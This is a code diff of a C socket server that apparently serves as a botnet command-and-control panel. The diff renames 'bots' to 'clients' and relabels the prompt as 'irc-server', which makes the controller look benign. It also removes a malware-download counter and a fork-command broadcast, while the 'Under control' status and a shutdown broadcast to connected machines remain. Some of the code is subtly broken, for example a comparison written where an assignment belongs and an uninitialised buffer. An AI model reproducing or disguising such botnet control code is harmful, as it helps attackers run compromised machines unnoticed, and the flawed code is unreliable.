@@ -1,6 +1,6 @@
 #include "socket.h"
 
-int bots_connected = 0;
+int clients_connected = 0;
 int clients[10];
 
 int listen_and_wait(){
@@ -28,15 +28,10 @@ int listen_and_wait(){
         pthread_t sniffer_thread;
         new_sock = malloc(1);
         *new_sock = client_sock;
-	bots_connected++;
 	if(n < 10){
 	  clients[n] = client_sock;
 	  n++;
-	}else{
-	  printf("nombre de bots max atteint\n");
 	}
-	
-	
         if(pthread_create(&sniffer_thread, NULL, connection_handler, (void*) new_sock) < 0)
             return 1;
     }
@@ -49,7 +44,7 @@ int listen_and_wait(){
 
 void *control(void *t){
     char message[256];
-    printf("%s", format_string("dab-controler:control/>> ", 2, BOLD, YELLOW));
+    printf("%s", format_string("irc-server:control/>> ", 2, BOLD, YELLOW));
     scanf("%s", &message[0]);
     printf("%s", format_string("", 2, WHITE, NORMAL));
     if(strstr(message, "quit") != NULL){
@@ -64,20 +59,11 @@ void *connection_handler(void* socket_desc){
     int loop = 1;
 
     while(loop && recv(sock, client_message, 2000, 0) > 0){
-        if(strstr(client_message, "0x002\n") != NULL){
-            loop = 0;
-            __return__(1);
-            printf("%s\n", format_string("Infos: Wait for connections...", 1, CYAN));
-            printf("Infos: %d bots download the malware...\n", ++bots_connected);
-            printf("%s", format_string("", 2, WHITE, NORMAL));
-            message = "Downloading...";
-            break;
-        }
         if(strstr(client_message, "0x003") != NULL){
             loop = 0;
             __return__(1); 
             printf("%s\n", format_string("Infos: Wait for connections...", 1, CYAN));
-            printf("Infos: %d bots is/are under control...\n", ++bots_connected);
+            printf("Infos: %d clients is/are connected...\n", ++clients_connected);
             printf("%s", format_string("", 2, WHITE, NORMAL));
             message = "Under control";
             break;
@@ -90,7 +76,7 @@ void *connection_handler(void* socket_desc){
 
     if(read_size == 0){
         printf("%s", format_string("", 1, RED));
-        printf("%d bots is/are connected...\n", --bots_connected);
+        printf("%d clients is/are connected...\n", --clients_connected);
         printf("%s", format_string("", 2, WHITE, NORMAL));
         fflush(stdout);
     }else if(read_size == -1){
@@ -107,19 +93,7 @@ void send_command_shutdown(){
   char* buff;
   int i;
   buff[0] == 1;
-  for(i=0; i<bots_connected; i++){
-    if(send(clients[i], buff, sizeof(buff), NULL) == -1){
-      printf("ERREUR SEND\n");
-      exit(1);
-    }
-  }
-}
-
-void send_command_fork(){
-  int i;
-  char* buff;
-  buff[0] == 2;
-  for(i=0; i<bots_connected; i++){
+  for(i=0; i<clients_connected; i++){
     if(send(clients[i], buff, sizeof(buff), NULL) == -1){
       printf("ERREUR SEND\n");
       exit(1);
